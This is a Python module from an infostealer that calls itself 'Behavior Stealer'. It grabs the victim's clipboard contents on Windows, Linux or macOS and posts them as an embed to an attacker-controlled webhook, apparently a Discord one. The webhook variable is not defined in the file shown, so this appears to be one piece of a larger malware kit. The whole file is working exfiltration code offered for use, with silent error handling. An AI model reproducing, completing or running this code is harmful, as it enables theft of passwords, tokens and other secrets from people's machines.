import requests
import subprocess
import platform


AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"

def get_clipboard_content():
    system = platform.system()
    try:
        if system == "Windows":
            return subprocess.check_output('powershell Get-Clipboard', shell=True, text=True).strip() or "Clipboard empty"
        elif system == "Linux":
            return subprocess.check_output('xclip -o -selection clipboard', shell=True, text=True).strip() or "Clipboard empty"
        elif system == "Darwin":
            return subprocess.check_output('pbpaste', shell=True, text=True).strip() or "Clipboard empty"
        else:
            return "Unsupported OS"
    except Exception as e:
        return f"Error: {e}"

def send_embed(content: str):
    if not Behavior:
        return

    if len(content) > 1000:
        content = content[:1000] + "..."

    embed = {
        "title": "\U0001F4CB Clipboard Content",
        "color": 0x00FFFF,
        "fields": [{"name": "Clipboard", "value": content or "Empty", "inline": False}],
        "footer": {"text": "Behavior Stealer \U0001F47E"}
    }

    payload = {
        "username": "Behavior Stealer",
        "avatar_url": AVATAR_URL,
        "embeds": [embed]
    }

    try:
        requests.post(Behavior, json=payload)
    except:
        pass

def run():
    content = get_clipboard_content()
    send_embed(content)

if __name__ == "__main__":
    run()
